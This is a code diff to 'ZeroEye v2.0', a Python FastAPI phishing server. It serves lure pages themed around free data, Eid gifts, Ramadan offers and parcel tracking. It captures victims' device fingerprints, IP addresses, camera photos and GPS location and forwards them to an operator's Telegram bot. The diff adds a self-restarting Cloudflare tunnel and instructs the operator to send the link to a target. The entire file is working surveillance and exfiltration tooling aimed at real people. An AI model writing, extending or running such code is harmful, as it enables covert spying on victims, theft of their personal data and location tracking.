@@ -3,6 +3,7 @@ import sys
 import json
 import time
 import shutil
+import atexit
 from fastapi import FastAPI, UploadFile, File, Form
 from fastapi.responses import HTMLResponse
 from fastapi.staticfiles import StaticFiles
@@ -41,10 +42,10 @@ CONFIG = {
     "template": "free_data"
 }
 bot = None
+tunnel_manager = None
 
 # --- CONFIG MANAGEMENT ---
 def load_config():
-    """Load configuration from file"""
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, 'r') as f:
@@ -55,7 +56,6 @@ def load_config():
     return None
 
 def save_config(conf):
-    """Save configuration to file"""
     try:
         with open(CONFIG_FILE, 'w') as f:
             json.dump(conf, f, indent=2)
@@ -65,7 +65,6 @@ def save_config(conf):
         return False
 
 def delete_config():
-    """Delete configuration file"""
     try:
         if os.path.exists(CONFIG_FILE):
             os.remove(CONFIG_FILE)
@@ -75,16 +74,24 @@ def delete_config():
     return False
 
 def save_local(filename, data):
-    """Save data to local file with timestamp"""
     try:
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         with open(f"captured/{filename}", "a", encoding='utf-8') as f:
-            f.write(f"\n{'='*50}\n")
+            f.write(f"\n{'='*60}\n")
             f.write(f"Timestamp: {timestamp}\n")
-            f.write(f"{'='*50}\n")
+            f.write(f"{'='*60}\n")
             f.write(f"{data}\n\n")
     except Exception as e:
         console.print(f"[red][!] Error saving local file: {e}[/red]")
+
+def cleanup():
+    """Cleanup function to stop tunnel on exit"""
+    global tunnel_manager
+    if tunnel_manager:
+        tunnel_manager.stop_tunnel()
+
+# Register cleanup function
+atexit.register(cleanup)
 
 # --- FASTAPI ROUTES ---
 @app.get("/")
@@ -100,60 +107,55 @@ async def receive_sys(data: str = Form(...)):
     try:
         info = json.loads(data)
         
-        # Create a rich table for display
-        table = Table(show_header=True, header_style="bold magenta")
-        table.add_column("Field", style="cyan", width=15)
-        table.add_column("Value", style="white")
+        table = Table(show_header=True, header_style="bold green")
+        table.add_column("Category", style="cyan", width=20)
+        table.add_column("Details", style="white")
         
-        for key, value in info.items():
-            table.add_row(key, str(value))
+        if 'basic' in info:
+            basic = info['basic']
+            table.add_row("📱 Device", f"{basic.get('platform', 'Unknown')}")
+            table.add_row("🖥️ Screen", f"{basic['screen']['width']}x{basic['screen']['height']}")
+            table.add_row("🌐 Timezone", basic['timezone']['name'])
         
-        console.print(Panel(
-            table,
-            title="🎯 [bold green]VICTIM CONNECTED[/bold green]",
-            border_style="green"
-        ))
+        if 'fingerprint' in info:
+            fp = info['fingerprint']
+            table.add_row("🔍 Fingerprint", f"Canvas: Available | Fonts: {len(fp.get('fonts', []))}")
         
-        # Format for Telegram
-        telegram_msg = "🎯 *NEW VICTIM CONNECTED*\n\n"
-        for key, value in info.items():
-            telegram_msg += f"*{key}:* {value}\n"
+        console.print(Panel(table, title="🎯 [bold green]VICTIM CONNECTED[/bold green]", border_style="green"))
         
-        # Send to Telegram if enabled
-        if bot: 
-            bot.send_message(telegram_msg)
+        if bot:
+            telegram_msg = "🎯 *NEW VICTIM CONNECTED*\n\n"
+            if 'basic' in info:
+                basic = info['basic']
+                telegram_msg += f"*Device:* {basic.get('platform', 'Unknown')}\n"
+                telegram_msg += f"*Screen:* {basic['screen']['width']}x{basic['screen']['height']}\n"
+                telegram_msg += f"*Timezone:* {basic['timezone']['name']}\n"
             
-        # Save locally
-        save_local("victims.txt", telegram_msg)
+            bot.send_message(telegram_msg)
+        
+        save_local("victims.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing system info: {e}[/red]")
         return {"status": "error"}
 
 @app.post("/upload_ip")
 async def receive_ip(data: str = Form(...)):
     try:
         info = json.loads(data)
-        ip_addr = info.get('internal_ip', 'Unknown')
+        ips = info.get('ips', [])
         
-        console.print(Panel(
-            f"[bold red]🌐 IP ADDRESS LEAKED[/bold red]\n\n"
-            f"[cyan]IP:[/cyan] [bold white]{ip_addr}[/bold white]",
-            title="Network Intelligence",
-            border_style="red"
-        ))
-        
-        # Send to Telegram
-        if bot: 
-            bot.send_message(f"🌐 *IP LEAK DETECTED*\n\n`{ip_addr}`")
+        for ip in ips:
+            console.print(f"[green][+] IP Leak: {ip}[/green]")
             
-        # Save locally
-        save_local("ip_logs.txt", f"IP Address: {ip_addr}")
+            if bot: 
+                bot.send_message(f"🌐 *IP Leak*\n\n`{ip}`")
+            
+            save_local("ip_logs.txt", f"IP: {ip}")
+        
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing IP info: {e}[/red]")
         return {"status": "error"}
 
 @app.post("/upload_cam")
@@ -163,70 +165,52 @@ async def receive_cam(file: UploadFile = File(...)):
         with open(filename, "wb") as buffer: 
             shutil.copyfileobj(file.file, buffer)
         
-        console.print(Panel(
-            f"[bold green]📸 CAMERA SHOT CAPTURED[/bold green]\n\n"
-            f"[cyan]File:[/cyan] {filename}",
-            title="Visual Intelligence",
-            border_style="green"
-        ))
+        console.print(f"[green][+] Camera shot captured[/green]")
         
-        # Send to Telegram
         if bot: 
             bot.send_photo(filename, caption="📸 *Camera Capture*")
             
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing camera shot: {e}[/red]")
         return {"status": "error"}
 
-@app.post("/upload_audio")
-async def receive_audio(file: UploadFile = File(...)):
+@app.post("/upload_location")
+async def receive_location(data: str = Form(...)):
     try:
-        filename = f"captured/audio_{int(time.time())}.webm"
-        with open(filename, "wb") as buffer: 
-            shutil.copyfileobj(file.file, buffer)
+        info = json.loads(data)
         
-        console.print(Panel(
-            f"[bold cyan]🎤 AUDIO RECORDING CAPTURED[/bold cyan]\n\n"
-            f"[cyan]File:[/cyan] {filename}",
-            title="Audio Intelligence", 
-            border_style="cyan"
-        ))
-        
-        # Send to Telegram
-        if bot: 
-            bot.send_audio(filename, caption="🎤 *Audio Recording*")
+        if 'latitude' in info:
+            console.print(Panel(
+                f"[bold yellow]📍 LOCATION CAPTURED[/bold yellow]\n\n"
+                f"[cyan]Latitude:[/cyan] {info['latitude']}\n"
+                f"[cyan]Longitude:[/cyan] {info['longitude']}",
+                title="Geolocation",
+                border_style="yellow"
+            ))
             
+            if bot:
+                bot.send_message(f"📍 *Location Data*\n\nLat: {info['latitude']}\nLon: {info['longitude']}")
+        
+        save_local("location.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing audio: {e}[/red]")
         return {"status": "error"}
+
+# Add other endpoints as needed...
 
 # --- WIZARD INTERFACE ---
 def start_wizard():
     console.clear()
     console.print(get_banner())
     
-    # Config persistence logic
+    # Config persistence
     saved_conf = load_config()
-    global bot, CONFIG
+    global bot, CONFIG, tunnel_manager
     
     if saved_conf:
         console.print("\n[cyan]📁 Found saved configuration[/cyan]")
-        
-        table = Table(show_header=False, box=None)
-        table.add_column("Setting", style="cyan")
-        table.add_column("Value", style="white")
-        
-        token_preview = saved_conf['bot_token'][:8] + "..." if saved_conf['bot_token'] else "Not set"
-        table.add_row("Bot Token", token_preview)
-        table.add_row("Chat ID", saved_conf['chat_id'] or "Not set")
-        table.add_row("Template", saved_conf['template'])
-        table.add_row("Telegram", "✅ Enabled" if saved_conf['telegram_enabled'] else "❌ Disabled")
-        
-        console.print(table)
         
         choice = Prompt.ask(
             "Use saved settings?", 
@@ -239,13 +223,11 @@ def start_wizard():
             if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                 bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
         elif choice == "delete":
-            if delete_config():
-                console.print("[green][✓] Configuration deleted[/green]")
+            delete_config()
             saved_conf = None
         else:
             saved_conf = None
 
-    # Telegram setup
     if not saved_conf:
         console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
         if Confirm.ask("Enable Telegram exfiltration?", default=True):
@@ -253,13 +235,9 @@ def start_wizard():
             CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
             CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
             
-            # Test configuration
             test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
             if Confirm.ask("Save these settings for future use?", default=True):
-                if save_config(CONFIG):
-                    console.print("[green][✓] Configuration saved[/green]")
-                else:
-                    console.print("[red][!] Failed to save configuration[/red]")
+                save_config(CONFIG)
             
             bot = test_bot
         else:
@@ -271,9 +249,9 @@ def start_wizard():
         "1": ("🎁 Free Data", "free_data"),
         "2": ("🌙 Eid Gift", "eid"), 
         "3": ("🕌 Ramadan", "ramadan"),
-        "4": ("🌍 Gulf Countries Bundle", "gulf"),
-        "5": ("💳 International Rewards", "rewards"),
-        "6": ("📦 Global Tracking", "tracking")
+        "4": ("🌍 Gulf Bundle", "gulf"),
+        "5": ("🎁 Rewards", "rewards"),
+        "6": ("📦 Tracking", "tracking")
     }
     
     for key, (name, _) in templates.items():
@@ -287,21 +265,38 @@ def start_wizard():
     port = 8080
     console.print(f"\n[green][*] Starting server on port {port}...[/green]")
     
-    tunnel = TunnelManager(port)
-    url = tunnel.start_cloudflared()
+    # Initialize tunnel manager with auto-healing
+    tunnel_manager = TunnelManager(port)
     
-    # Display final attack panel
+    console.print("[cyan][*] Establishing secure tunnel (auto-healing enabled)...[/cyan]")
+    url = tunnel_manager.start_cloudflared()
+    
+    if url.startswith("Error:"):
+        console.print(Panel(
+            f"[bold red]❌ TUNNEL ERROR[/bold red]\n\n"
+            f"[yellow]{url}[/yellow]\n\n"
+            f"[cyan]Troubleshooting steps:[/cyan]\n"
+            f"1. Check your internet connection\n"
+            f"2. Ensure Cloudflare is not blocked\n"
+            f"3. Try again in 2-3 minutes\n"
+            f"4. Restart the tool",
+            title="Connection Issue",
+            border_style="red"
+        ))
+        return
+    
     console.print(Panel(
-        f"[bold cyan]🎯 ATTACK LINK READY[/bold cyan]\n\n"
+        f"[bold cyan]🎯 ZEROEYE READY[/bold cyan]\n\n"
         f"[bold green]{url}[/bold green]\n\n"
-        f"[yellow]📋 Copy this link and send it to your target[/yellow]\n"
-        f"[grey50]💡 Pro Tip: Use a URL shortener to mask the link![/grey50]",
-        title="ZeroEye v2.0 - Ready",
+        f"[yellow]📋 Send this link to your target[/yellow]\n"
+        f"[green]✅ Auto-healing tunnel active[/green]\n"
+        f"[grey50]💡 Tunnel will automatically recover from errors[/grey50]",
+        title="ZeroEye v2.0 - Professional",
         border_style="green",
         expand=False
     ))
     
-    console.print("\n[cyan]🛡️  Server running... Press Ctrl+C to stop[/cyan]")
+    console.print("\n[cyan]🛡️  Server running with auto-healing tunnel...[/cyan]")
     console.print("[yellow]📁 Data will be saved to: captured/ folder[/yellow]")
     
     try:
@@ -310,6 +305,8 @@ def start_wizard():
         console.print("\n[yellow][!] Shutting down ZeroEye...[/yellow]")
     except Exception as e:
         console.print(f"[red][!] Server error: {e}[/red]")
+    finally:
+        cleanup()
 
 if __name__ == "__main__":
     start_wizard()
